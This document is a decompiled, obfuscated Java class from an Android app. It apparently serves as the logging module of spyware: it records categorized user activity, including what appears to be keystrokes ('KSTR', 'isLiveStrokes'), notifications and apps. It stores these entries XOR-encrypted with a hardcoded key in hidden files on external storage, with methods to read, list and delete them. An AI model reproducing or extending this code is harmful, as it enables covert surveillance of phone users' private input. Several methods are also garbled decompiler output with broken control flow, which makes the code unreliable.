/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.os.Environment
 *  android.text.format.DateFormat
 *  android.util.Base64
 */
package linker.resourcer.encoder;

import android.os.Environment;
import android.text.format.DateFormat;
import android.util.Base64;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.Reader;
import java.io.Writer;
import java.util.Date;
import linker.resourcer.encoder.ffbrxjknfnpfxahr;

public class idevsogvogbankcjxyaafkymo {
    private static final String SECRET_KEY = "GndZJWejB1GVLVK548VbLBWbL8w8fe";
    public static boolean isLiveStrokes = false;

    public static void Clear(ActivityType object) {
        try {
            object = object.name();
            File file = Environment.getExternalStorageDirectory();
            StringBuilder stringBuilder = new StringBuilder();
            File file2 = new File(file, stringBuilder.append("IC/").append((String)object).toString());
            if (file2.exists()) {
                ffbrxjknfnpfxahr.deleteRecursive(file2);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    public static String Load(ActivityType object) {
        int n;
        File[] fileArray;
        try {
            fileArray = ((Enum)object).name();
            object = new StringBuilder();
            fileArray = ((StringBuilder)object).append(Environment.getExternalStorageDirectory().toString()).append("/IC/").append((String)fileArray).toString();
            object = new File((String)fileArray);
            fileArray = ((File)object).listFiles();
            object = "";
            n = 0;
        }
        catch (Exception exception) {
            return "null";
        }
        while (true) {
            if (n >= fileArray.length) return object;
            StringBuilder stringBuilder = new StringBuilder();
            object = stringBuilder.append((String)object).append(fileArray[n].getName().replace(".txt", "")).append("<*P*>").toString();
            ++n;
            continue;
            break;
        }
    }

    /*
     * Could not resolve type clashes
     * Loose catch block
     */
    public static String Read(String charSequence, ActivityType object) {
        object = ((Enum)object).name();
        String[] stringArray = Environment.getExternalStorageDirectory();
        object = new File(stringArray + "/IC/" + (String)object + "/", (String)charSequence + ".txt");
        charSequence = new StringBuilder();
        stringArray = new FileInputStream((File)object);
        Object object22 = new InputStreamReader((InputStream)stringArray);
        object = new BufferedReader((Reader)object22);
        object22 = new StringBuilder();
        while (true) {
            stringArray = ((BufferedReader)object).readLine();
            if (stringArray == null) break;
            ((StringBuilder)object22).append((String)stringArray);
            continue;
            break;
        }
        for (Object object22 : ((StringBuilder)object22).toString().split(":::")) {
            if (((String)object22).trim().isEmpty()) continue;
            ((StringBuilder)charSequence).append(idevsogvogbankcjxyaafkymo.de((String)object22));
        }
        ((BufferedReader)object).close();
        catch (Throwable throwable) {
            ((BufferedReader)object).close();
            throw throwable;
        }
        catch (IOException iOException) {
            ((BufferedReader)object).close();
            {
                catch (Exception exception) {
                    // empty catch block
                }
            }
        }
        return ((StringBuilder)charSequence).toString();
    }

    public static void Record(String string2, ActivityType activityType) {
        new Thread(new Runnable(){
            final String val$text;
            final ActivityType val$type;
            {
                this.val$type = activityType;
                this.val$text = string2;
            }

            /*
             * Unable to fully structure code
             * Could not resolve type clashes
             */
            @Override
            public void run() {
                var1_1 = this.val$type.name();
                var2_6 = new Date();
                var4_8 = DateFormat.format((CharSequence)"yyyy-MM-dd", (Date)var2_6).toString();
                var2_6 = Environment.getExternalStorageDirectory();
                var5_13 /* !! */  = new StringBuilder();
                var3_10 = new File((File)var2_6, var5_13 /* !! */ .append("IC/").append((String)var1_1).toString());
                var1_1 = new StringBuilder();
                var2_6 = new File((File)var3_10, var1_1.append((String)var4_8).append(".txt").toString());
                if (!var3_10.exists()) {
                    var3_10.mkdirs();
                }
                var1_1 = var2_6;
                if (!var2_6.exists()) ** GOTO lbl27
                var1_1 = var2_6;
                if (var2_6.length() >= 0x100000L) {
                    do {
                        var1_1 = new StringBuilder();
                        var5_13 /* !! */  = var1_1.append((String)var4_8).append("_").append(1).append(".txt").toString();
                    } while ((var1_1 = new File((File)var3_10, (String)var5_13 /* !! */ )).exists());
                    var2_6.renameTo((File)var1_1);
                    var2_6 = new StringBuilder();
                    var1_1 = new File((File)var3_10, var2_6.append((String)var4_8).append(".txt").toString());
                }
lbl27:
                // 4 sources

                if (!var1_1.exists()) {
                    var1_1.createNewFile();
                }
                var2_6 = new StringBuilder();
                var3_10 = new StringBuilder();
                var3_10 = var2_6.append(idevsogvogbankcjxyaafkymo.en(var3_10.append(this.val$text).append(">").toString())).append(":::").toString();
                var2_6 = new FileOutputStream((File)var1_1, true);
                var1_1 = new OutputStreamWriter((OutputStream)var2_6);
                var4_8 = new BufferedWriter((Writer)var1_1);
                var4_8.write((String)var3_10);
                var4_8.close();
                var1_1.close();
                var2_6.close();
                catch (Throwable var3_11) {
                    try {
                        var4_8.close();
                        ** GOTO lbl55
                    }
                    catch (Throwable var4_9) {
                        try {
                            var3_11.addSuppressed(var4_9);
lbl55:
                            // 2 sources

                            throw var3_11;
                        }
                        catch (Throwable var3_12) {
                            try {
                                var1_1.close();
                                ** GOTO lbl63
                            }
                            catch (Throwable var1_2) {
                                try {
                                    var3_12.addSuppressed(var1_2);
lbl63:
                                    // 2 sources

                                    throw var3_12;
                                }
                                catch (Throwable var1_3) {
                                    try {
                                        var2_6.close();
                                        ** GOTO lbl71
                                    }
                                    catch (Throwable var2_7) {
                                        var1_3.addSuppressed(var2_7);
lbl71:
                                        // 2 sources

                                        throw var1_3;
                                        {
                                            catch (IOException var1_4) {
                                                try {
                                                    var1_4.printStackTrace();
                                                }
                                                catch (Exception var1_5) {
                                                    var1_5.printStackTrace();
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }).start();
    }

    public static void Remove(String string2, ActivityType object) {
        String string3 = ((Enum)object).name();
        File file = Environment.getExternalStorageDirectory();
        File file2 = new File(file + "/IC/" + string3 + "/", string2 + "\n.txt");
        object = file2;
        if (!file2.exists()) {
            object = new File(file + "/IC/" + string3 + "/", string2 + ".txt");
        }
        try {
            if (((File)object).exists()) {
                ((File)object).delete();
            }
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    public static String de(String string2) {
        Object object = SECRET_KEY.getBytes("UTF-8");
        byte[] byArray = Base64.decode((String)string2, (int)0);
        byte[] byArray2 = new byte[byArray.length];
        int n = 0;
        while (true) {
            if (n >= byArray.length) break;
            byArray2[n] = (byte)(byArray[n] ^ object[n % ((byte[])object).length]);
            ++n;
            continue;
            break;
        }
        try {
            object = new String(byArray2, "UTF-8");
            return object;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return string2;
        }
    }

    public static String en(String string2) {
        byte[] byArray = SECRET_KEY.getBytes("UTF-8");
        byte[] byArray2 = string2.getBytes("UTF-8");
        Object object = new byte[byArray2.length];
        int n = 0;
        while (true) {
            if (n >= byArray2.length) break;
            object[n] = (byte)(byArray2[n] ^ byArray[n % byArray.length]);
            ++n;
            continue;
            break;
        }
        try {
            object = Base64.encodeToString((byte[])object, (int)0);
            return object;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return string2;
        }
    }

    public static enum ActivityType {
        ACTZ,
        KSTR,
        BLNK,
        VAPS,
        NTFS,
        ARTS;

    }
}

